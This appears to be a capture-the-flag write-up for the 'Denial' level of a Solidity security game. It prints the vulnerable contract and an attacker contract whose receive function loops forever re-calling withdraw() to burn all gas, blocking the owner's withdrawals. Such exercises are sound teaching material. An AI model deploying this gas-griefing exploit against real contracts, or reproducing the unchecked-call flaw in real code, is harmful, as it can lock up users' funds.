## 20. Denial

Goal for this exercise is:

- Deny the owner from withdrawing funds

<br/>

Here is the contract code:
~~~
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Denial {

    using SafeMath for uint256;
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address payable public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance.div(100);
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call.value(amountToSend)("");
        owner.transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = now;
        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);
    }

    // allow deposit of funds
    fallback() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}
~~~
<br>
Plan was to make `Denied` contract `partner` address and burn all gas in infinite loop:

~~~
pragma solidity ^0.6.0;

interface Denial {
  function withdraw() external;
}

contract Denied {

    Denial denial = Denial(0x1234...);
    address payable owner;
    uint public counter;
    bool public cameHere;
    
    // fund contract here
    constructor() public payable {
        owner = msg.sender;
    }
    
    receive() external payable {
        // loop here to burn all gas 
        counter++;
        while(true) {
            denial.withdraw();  // recall withdrow()
        }
        cameHere = true;
    }
    
    function debugWithdraw() public {
        require(msg.sender == owner, "Only owner can call");
        owner.transfer(address(this).balance);
    }
}
~~~











